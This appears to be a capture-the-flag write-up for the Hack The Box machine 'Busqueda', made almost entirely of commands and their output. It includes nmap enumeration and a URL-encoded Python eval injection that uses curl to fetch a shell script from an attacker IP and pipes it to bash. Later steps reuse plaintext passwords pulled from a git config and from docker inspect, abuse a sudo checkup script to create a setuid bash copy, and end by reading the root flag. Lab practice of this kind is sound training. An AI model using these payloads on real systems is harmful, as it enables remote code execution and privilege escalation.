#HackTheBox #linux 
# 1- Enumeration
## Nmap
┌──(root㉿kali)-[~]
└─# nmap -p 22,80 -sC -sV 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 06:27 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


# Exploit python injection
[query=]http%3a/127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.15/shell|bash")','a','single'))%2b'

# Foot Hold
[svc@busqueda:~$] cat user.txt
d6ff0da1b6932543d041db66d1856197

[svc@busqueda:/var/www/app/.git$] cat config
	[core]
	        repositoryformatversion = 0
	        filemode = true
	        bare = false
	        logallrefupdates = true
	[remote "origin"]
	        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	        fetch = +refs/heads/*:refs/remotes/origin/*
	[branch "main"]
	        remote = origin
	        merge = refs/heads/main

passeword = jh1usoih2bkjaspwe92

┌──(root㉿kali)-[/media/…/challenge/HTB/machine/busqueda]
└─# ssh svc@searcher.htb           
svc@searcher.htb's password:  jh1usoih2bkjaspwe92

[svc@busqueda:~$] sudo -l	
	User svc may run the following commands on busqueda:
	    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

# PrivEsc
[svc@busqueda:/opt/scripts$] sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
	[sudo] password for svc: 
	Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
	
	     docker-ps     : List running docker containers
	     docker-inspect : Inpect a certain docker container
	     full-checkup  : Run a full system checkup


$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
	"GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
	"GITEA__database__USER=gitea",
	      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
	      
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
	"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
	      "MYSQL_USER=gitea",
	      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
	      "MYSQL_DATABASE=gitea",
	"IPAddress": "172.19.0.3",

$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea

svc@busqueda:/tmp$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/zelo\nchmod 4777 /tmp/zelo' > full-checkup.sh
svc@busqueda:/tmp$ chmod +x full-checkup.sh 
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ./zelo 
zelo-5.1$ exit
exit
svc@busqueda:/tmp$ ./zelo -p
zelo-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)

bash-5.1# cd /root
bash-5.1# ls
ecosystem.config.js  root.txt  scripts  snap
bash-5.1# cat root.txt 
f325765ec858c7cd95b69266f6bb8ee7